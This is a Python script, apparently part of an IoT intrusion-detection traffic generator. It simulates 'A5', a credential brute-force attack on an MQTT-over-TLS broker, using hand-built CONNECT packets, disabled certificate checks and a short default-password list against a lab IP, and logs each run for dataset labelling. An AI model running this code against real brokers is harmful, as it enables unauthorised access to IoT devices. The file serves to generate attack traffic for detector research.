#!/usr/bin/env python3
"""
traffic/attacks/a5_bruteforce.py — A5: Credential brute force against MQTT-over-TLS.

Simulates password dictionary attacks / brute force attempts against an MQTT broker
over TLS on port 8883 with rapid authentication failures and reconnections.
"""
import ssl
import socket
import time
import random
import argparse
import os
import sys

REPO_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
sys.path.insert(0, REPO_DIR)
from traffic.manifest import ManifestWriter


def build_mqtt_connect_packet(client_id: str, username: str, password: str) -> bytes:
    """Construct a raw MQTT 3.1.1 CONNECT packet with credentials."""
    protocol_name = b"\x00\x04MQTT\x04"  # MQTT 3.1.1
    flags = 0x80 | 0x40 | 0x02  # User, Pass, CleanSession
    keepalive = b"\x00\x3c"  # 60s

    payload = bytearray()
    # Client ID
    cid_b = client_id.encode("utf-8")
    payload.extend(len(cid_b).to_bytes(2, "big") + cid_b)
    # Username
    u_b = username.encode("utf-8")
    payload.extend(len(u_b).to_bytes(2, "big") + u_b)
    # Password
    p_b = password.encode("utf-8")
    payload.extend(len(p_b).to_bytes(2, "big") + p_b)

    var_header = protocol_name + bytes([flags]) + keepalive
    remaining = var_header + bytes(payload)
    fixed_header = bytes([0x10, len(remaining)])  # 0x10 = CONNECT
    return fixed_header + remaining


def run_a5_bruteforce(target_ip="10.0.2.10", target_port=8883,
                      attempts=30, duration_s=20.0,
                      manifest_path="results/manifest.csv", run_id="run_exp"):
    print(f"[A5 BRUTE FORCE] Attacking MQTT credentials on {target_ip}:{target_port} ({attempts} attempts)")
    writer = ManifestWriter(manifest_path, run_id=run_id)
    start_ts = time.time()

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    passwords = ["admin", "123456", "root", "toor", "password", "iot_gateway", "secret"]
    completed = 0

    while completed < attempts and (time.time() - start_ts < duration_s):
        completed += 1
        pw = random.choice(passwords)
        pkt = build_mqtt_connect_packet(f"attacker_{completed}", "admin", pw)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            tls = ctx.wrap_socket(s, server_hostname=target_ip)
            tls.connect((target_ip, target_port))
            tls.sendall(pkt)
            try:
                # Expect CONNACK with return code 0x04 or 0x05 (Bad User/Pass)
                tls.recv(32)
            except Exception:
                pass
            tls.close()
        except Exception:
            pass
        time.sleep(random.uniform(0.1, 0.4))

    end_ts = time.time()
    writer.record_episode(
        family="A5_bruteforce",
        src_ip="10.0.1.4",
        dst_ip=target_ip,
        dst_port=target_port,
        start_ts=start_ts,
        end_ts=end_ts,
        params={"attempts": completed, "duration_s": duration_s},
    )
    print(f"[A5 BRUTE FORCE] Completed {completed} credential brute-force probes.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="10.0.2.10")
    parser.add_argument("--port", type=int, default=8883)
    parser.add_argument("--attempts", type=int, default=30)
    parser.add_argument("--duration", type=float, default=20.0)
    parser.add_argument("--manifest", default="results/manifest.csv")
    parser.add_argument("--run-id", default="run_a5")
    args = parser.parse_args()

    run_a5_bruteforce(args.target, args.port, args.attempts, args.duration, args.manifest, args.run_id)

